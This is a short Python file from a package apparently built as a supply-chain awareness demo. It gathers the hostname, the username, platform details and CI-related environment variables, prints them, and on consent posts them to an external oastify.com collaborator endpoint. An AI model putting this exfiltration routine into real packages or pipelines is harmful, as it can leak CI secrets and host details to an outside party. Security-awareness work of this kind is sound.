# demo_pkg/main.py
import os
import socket
import sys
import requests

def awareness_demo():
    data = {
        "hostname": socket.gethostname(),
        "username": os.environ.get("USER") or os.environ.get("USERNAME"),
        "python_version": sys.version,
        "platform": sys.platform,
        "ci_env": {k: v for k, v in os.environ.items() if "CI" in k.upper()}
    }
    print("\n[DEMO] This package can access the following data:\n")
    for k, v in data.items():
        print(f"{k}: {v}")

    consent = input("\nSend this data to demo endpoint? (yes/no): ").strip().lower()
    if consent in ("yes", "y"):
        try:
            response = requests.post(
                "https://y21bw8mkxzj2tmkfqkzegcg88zeq2jq8.oastify.com",
                json=data,
                timeout=5
            )
            print(f"Status: {response.status_code}")
        except Exception as e:
            print(f"Error: {e}")
    else:
        print("Cancelled.")
